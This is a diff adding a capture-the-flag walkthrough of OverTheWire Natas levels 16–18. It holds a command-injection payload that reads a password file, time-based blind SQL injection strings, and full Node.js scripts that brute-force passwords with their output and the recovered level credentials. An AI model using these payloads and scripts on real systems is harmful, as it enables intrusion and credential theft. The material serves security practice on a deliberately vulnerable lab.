@@ -250,11 +250,186 @@ app.listen(port, () => console.log(`Example app listening at http://localhost:${
     - Finding all the characters present in the password beforehand (by using %ch%)
 
 ### Level 16 `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
+- Given the character we're not allowed to use, our only choice is to nest a command inside the grep paramter.
+- So what we'll do is we'll submit this in the box:
+```
+submit$(grep -e ^a /etc/natas_webpass/natas17)
+```
+- If the password of natas17 begins with a, our nested block will be replaced by the actual password and there will be now output, because the outer command will end up grepping submit*some-gibberish*
+- On the other hand if the password of natas17 doesn't begin with a, out nested block will be replace with a blank string and the outer command will return a bunch of words (having 'submit' in them).
+- We'll use this technique to brute-force the password out:
+```javascript
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const port = 3000;
+
+app.get('/', (req, res) => res.send('Hello World!'));
+
+const headers = {
+    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
+}
+async function req(ch) {
+    const res = await axios.get(`http://natas16.natas.labs.overthewire.org/?needle=submit%24%28grep+-e+%5E${ch}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search`, {headers});
+    if(res.data.includes('resubmitting')) {
+        return false;
+    } else {
+        return true;
+    }
+}
+
+async function calc() {
+    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
+    let ans = '';
+    
+    for(let i=0; i<alphanum.length; i++) {
+        let val = await req(ans + alphanum[i]);
+        if(val) {
+            ans += alphanum[i];
+            console.log(ans);
+            i = -1;
+        }
+    }
+    console.log('fin');
+}
+
+calc();
+
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));
+
+// Outputs:
+// Example app listening at http://localhost:3000
+// 8
+// 8P
+// 8Ps
+// 8Ps3
+// 8Ps3H
+// 8Ps3H0
+// 8Ps3H0G
+// 8Ps3H0GW
+// 8Ps3H0GWb
+// 8Ps3H0GWbn
+// 8Ps3H0GWbn5
+// 8Ps3H0GWbn5r
+// 8Ps3H0GWbn5rd
+// 8Ps3H0GWbn5rd9
+// 8Ps3H0GWbn5rd9S
+// 8Ps3H0GWbn5rd9S7
+// 8Ps3H0GWbn5rd9S7G
+// 8Ps3H0GWbn5rd9S7Gm
+// 8Ps3H0GWbn5rd9S7GmA
+// 8Ps3H0GWbn5rd9S7GmAd
+// 8Ps3H0GWbn5rd9S7GmAdg
+// 8Ps3H0GWbn5rd9S7GmAdgQ
+// 8Ps3H0GWbn5rd9S7GmAdgQN
+// 8Ps3H0GWbn5rd9S7GmAdgQNd
+// 8Ps3H0GWbn5rd9S7GmAdgQNdk
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkh
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
+// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+// fin
+```
+
+### Level 17 `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
+- It's apparent that there's no way we can get the code to print anything other that the query being executed. (The lines of code are commented, we cannont change that.)
+- So we need to use the time based approach of SQL Injection to find the password. Try to following input:
+```
+natas18" and sleep(10) -- 
+```
+- We notice that there's a 10 second delay in the response. Now let's try with something that we know for sure is not present in the database, to make sure this works.
+```
+ankush" and sleep(10) -- 
+```
+- There's no delay in the response so the time based approach is working. We can now add the password we need to find for the user "natas18"
+```
+natas18" and password like "%" and sleep(10) -- 
+```
+- Ten second delay is noticed. Perfect now we need a script to brute-force the password out, much like natas15:
+```javascript
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const port = 3000;
+
+app.get('/', (req, res) => res.send('Hello World!'));
+
+const headers = {
+    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
+}
+async function req(ch) {
+    let aTime = new Date();
+    const res = await axios.post(`http://natas17.natas.labs.overthewire.org/index.php`, `username=natas18%22+and+password+like+binary+%22${ch}%25%22+and+sleep%285%29+--+`, {headers});
+    let bTime = new Date();
+    let diff = (bTime.getTime() - aTime.getTime()) / 1000;
+    if(diff >= 5) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+async function calc() {
+    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
+    let ans = '';
+    
+    for(let i=0; i<alphanum.length; i++) {
+        let val = await req(ans + alphanum[i]);
+        if(val) {
+            ans += alphanum[i];
+            console.log(ans);
+            i = -1;
+        }
+    }
+    console.log('fin');
+}
+
+calc();
+
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));
+
+// Outputs:
+// Example app listening at http://localhost:3000
+// x
+// xv
+// xvK
+// xvKI
+// xvKIq
+// xvKIqD
+// xvKIqDj
+// xvKIqDjy
+// xvKIqDjy4
+// 0xvKIqDjy4O
+// xvKIqDjy4OP
+// xvKIqDjy4OPv
+// xvKIqDjy4OPv7
+// xvKIqDjy4OPv7w
+// xvKIqDjy4OPv7wC
+// xvKIqDjy4OPv7wCR
+// xvKIqDjy4OPv7wCRg
+// xvKIqDjy4OPv7wCRgD
+// xvKIqDjy4OPv7wCRgDl
+// xvKIqDjy4OPv7wCRgDlm
+// xvKIqDjy4OPv7wCRgDlmj
+// xvKIqDjy4OPv7wCRgDlmj0
+// xvKIqDjy4OPv7wCRgDlmj0p
+// xvKIqDjy4OPv7wCRgDlmj0pF
+// xvKIqDjy4OPv7wCRgDlmj0pFs
+// xvKIqDjy4OPv7wCRgDlmj0pFsC
+// xvKIqDjy4OPv7wCRgDlmj0pFsCs
+// xvKIqDjy4OPv7wCRgDlmj0pFsCsD
+// xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
+// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
+// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
+// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+// fin
+```
+
+### Level 18 `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
 - 
-
-### Level 17 ``
-
-### Level 18 ``
 
 ### Level 19 ``
 
